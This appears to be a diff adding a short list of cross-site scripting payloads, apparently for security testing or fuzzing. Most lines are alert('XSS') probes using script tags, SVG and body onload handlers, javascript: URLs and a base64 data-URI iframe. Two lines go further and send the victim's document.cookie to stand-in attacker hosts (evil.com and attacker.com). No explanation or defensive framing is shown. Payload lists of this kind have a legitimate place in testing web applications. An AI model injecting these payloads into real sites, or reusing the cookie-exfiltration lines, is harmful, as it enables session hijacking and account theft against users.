@@ -1,0 +1,13 @@
+<script>alert('XSS')</script>
+"><script>alert('XSS')</script>
+<svg onload=alert('XSS')>
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC=`javascript:alert("XSS")`>
+<script>document.write('<img src="http://evil.com/steal?cookie='+document.cookie+'">');</script>
+document.location='http://attacker.com/?cookie='+document.cookie;
+<body onload=alert("XSS")>
+<a href="javascript:alert('XSS')">Click me</a>
+<svg/onload=alert('XSS')>
+"><script>alert('XSS')</script>
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4="></iframe>
